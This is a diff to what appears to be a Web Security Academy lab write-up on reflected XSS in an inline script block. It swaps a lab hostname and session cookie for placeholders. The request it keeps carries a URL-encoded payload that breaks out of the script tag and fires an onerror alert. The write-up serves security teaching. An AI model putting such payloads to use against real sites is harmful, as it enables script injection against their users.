@@ -28,8 +28,8 @@ If user input is reflected inside an inline `<script>` block and the application
 Request:
 ```http
 GET /?search=%3C%2Fscript%3E%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E HTTP/2
-Host: 0a7c00cb0426628f81e920fc00c3008e.web-security-academy.net
-Cookie: session=TZ7hdjMBmIHXQFuv23v3XJtPAVOeij8I
+Host: <host>.web-security-academy.net
+Cookie: session=sess
 Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
@@ -41,7 +41,7 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: navigate
 Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
-Referer: https://0a7c00cb0426628f81e920fc00c3008e.web-security-academy.net/?search=%3Ctest
+Referer: https://<host>.web-security-academy.net/?search=%3Ctest
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 ```
